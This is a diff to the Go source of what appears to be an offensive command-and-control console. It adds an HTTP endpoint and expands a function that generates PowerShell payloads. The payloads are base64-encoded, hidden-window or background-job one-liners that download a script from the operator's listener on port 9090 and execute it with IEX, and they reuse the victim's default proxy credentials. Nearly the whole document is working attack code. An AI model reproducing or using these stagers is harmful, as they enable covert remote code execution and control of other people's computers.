@@ -44,7 +44,8 @@ var (
 	AGENTS                                   map[string]string
 	session_id                               string = ""
 	Host                                     string = ""
-	back string = ""
+	back                                     string = ""
+	commandF                                 string = ""
 	//全局变量
 )
 
@@ -59,11 +60,11 @@ func GetRandomString(l int) string {
 	return string(result)
 }
 
-func replace(web_data string)string  {
+func replace(web_data string) string {
 	reg, _ := regexp.Compile(" ")
 	data := reg.ReplaceAllString(web_data, "+")
 	return data
-	
+
 }
 
 func httpserver(w http.ResponseWriter, r *http.Request) {
@@ -78,6 +79,7 @@ func httpserver(w http.ResponseWriter, r *http.Request) {
 	url_up, _ := regexp.Compile("/up/*")
 	url_img, _ := regexp.Compile("/img/*")
 	url_get, _ := regexp.Compile("/get")
+	url_hjf, _ := regexp.Compile("/hjf")
 
 	//info
 	if url_info.MatchString(r.URL.Path) {
@@ -168,6 +170,8 @@ func httpserver(w http.ResponseWriter, r *http.Request) {
 		} else {
 			fmt.Fprintln(w, payload)
 		}
+	} else if url_hjf.MatchString(r.URL.Path) {
+		fmt.Fprintln(w, commandF)
 	} else {
 		fmt.Fprintf(w, "")
 	}
@@ -200,6 +204,63 @@ func info_os() {
 
 }
 
+//---------------------------------------------------------------
+func Hosts() {
+	Blue := color.New(color.FgBlue).SprintFunc() //颜色设定 https://github.com/fatih/color
+
+	prompt := &survey.Input{
+		Message: "set ip",
+	}
+
+	survey.AskOne(prompt, &Host, survey.WithIcons(func(icons *survey.IconSet) {
+
+		icons.Question.Text = "メ "
+		icons.Question.Format = "red+hb"
+
+	}))
+	//---------------------------------------------------------------
+	fmt.Printf("%s setting listener => %s:9090 \n", Blue("[*]"), Host) //https://github.com/fatih/color
+	fmt.Println("\n")
+	//---------------------------------------------------------------
+	payload := "$V=new-object net.webclient;$V.proxy=[Net.WebRequest]::GetSystemWebProxy();$V.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;$S=$V.DownloadString('http://" + Host + ":9090/get');IEX($s)"
+
+	strbytes := []byte(payload)
+	encoded := base64.StdEncoding.EncodeToString(strbytes)
+	//---------------------------------------------------------------
+	commandJ := "Start-Job -scriptblock {iex([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String('" + encoded + "')))}"
+	commandF = commandJ
+	fmt.Printf("%s %s \n", Blue("[*]"), "---+Powershell JOB Payload+---")
+	fmt.Printf("%s %s \n", Blue("[☠ ]"), commandJ)
+	fmt.Println("\n")
+	//---------------------------------------------------------------
+	commandP := "Start-Process powershell -ArgumentList " + "\"iex([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String('" + encoded + "')))\"" + " -WindowStyle Hidden"
+	fmt.Printf("%s %s \n", Blue("[*]"), "---+Powershell New Process Payload+---")
+	fmt.Printf("%s %s \n", Blue("[☠ ]"), commandP)
+	fmt.Println("\n")
+	//---------------------------------------------------------------
+	commandF_IP := "$V=new-object net.webclient;$V.proxy=[Net.WebRequest]::GetSystemWebProxy();$V.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;$S=$V.DownloadString('http://" + Host + ":9090/hjf');IEX($s)"
+	commandF_strbytes := []byte(commandF_IP)
+	commandF_encoded := base64.StdEncoding.EncodeToString(commandF_strbytes)
+	commandF := "iex([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String('" + commandF_encoded + "')))"
+	fmt.Printf("%s %s \n", Blue("[*]"), "---+Powershell JOB + File Payload+---")
+	fmt.Printf("%s %s \n", Blue("[☠ ]"), commandF)
+	fmt.Println("\n")
+	//---------------------------------------------------------------
+	simple_payload := "powershell -w hidden \"$h = (New-Object Net.WebClient).DownloadString('http://" + Host + ":9090/get');Invoke-Expression $h;\""
+
+	simple_payload2 := "powershell -w hidden \"IEX(New-Object Net.WebClient).DownloadString('http://" + Host + ":9090/get');\""
+	simple_payload3 := "powershell -w hidden \"Invoke-Expression(New-Object Net.WebClient).DownloadString('http://" + Host + ":9090/get');\""
+	fmt.Printf("%s %s \n", Blue("[*]"), "---+ Powershell simple payloads +---")
+	fmt.Printf("%s %s \n", Blue("[☠ ]"), simple_payload)
+	fmt.Println("\n")
+	fmt.Printf("%s %s \n", Blue("[☠ ]"), simple_payload2)
+	fmt.Println("\n")
+	fmt.Printf("%s %s \n", Blue("[☠ ]"), simple_payload3)
+	fmt.Println("\n")
+}
+
+//---------------------------------------------------------------
+
 func Scanf(a *string) {
 	reader := bufio.NewReader(os.Stdin)
 	data, _, _ := reader.ReadLine()
@@ -215,7 +276,7 @@ func Scanf(a *string) {
 		//帮助参数
 	} else if string(data) == "back" {
 		*a = ""
-		back="back"
+		back = "back"
 		return
 	}
 	*a = string(data)
@@ -261,33 +322,6 @@ func Session_id(id string) {
 
 }
 
-func Hosts() {
-	Blue := color.New(color.FgBlue).SprintFunc() //颜色设定 https://github.com/fatih/color
-
-	prompt := &survey.Input{
-		Message: "set ip",
-	}
-
-	survey.AskOne(prompt, &Host, survey.WithIcons(func(icons *survey.IconSet) {
-
-		icons.Question.Text = "メ "
-		icons.Question.Format = "red+hb"
-
-	}))
-	fmt.Printf("%s setting listener => %s:9090 \n", Blue("[*]"), Host) //https://github.com/fatih/color
-	fmt.Println("\n")
-	payload := "$V=new-object net.webclient;$V.proxy=[Net.WebRequest]::GetSystemWebProxy();$V.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;$S=$V.DownloadString('http://" + Host + ":9090/get');IEX($s)"
-
-	strbytes := []byte(payload)
-	encoded := base64.StdEncoding.EncodeToString(strbytes)
-	// fmt.Println(encoded)
-	commandJ := "Start-Job -scriptblock {iex([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String('" + encoded + "')))}"
-	fmt.Printf("%s %s \n", Blue("[☠ ]"), commandJ)
-	fmt.Println("\n")
-	commandP := "Start-Process powershell -ArgumentList " + "\"iex([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String('" + encoded + "')))\"" + " -WindowStyle Hidden"
-	fmt.Printf("%s %s \n", Blue("[☠ ]"), commandP)
-	fmt.Println("\n")
-}
 func Options() { //定义tab 下拉菜单选项参数
 	for true {
 		options := prompt.Input("SSF >", completer,
@@ -300,8 +334,8 @@ func Options() { //定义tab 下拉菜单选项参数
 			for true {
 				fmt.Print("Console_shell >")
 				Scanf(&cmd)
-				if back=="back"{
-					back=""
+				if back == "back" {
+					back = ""
 					break
 				}
 
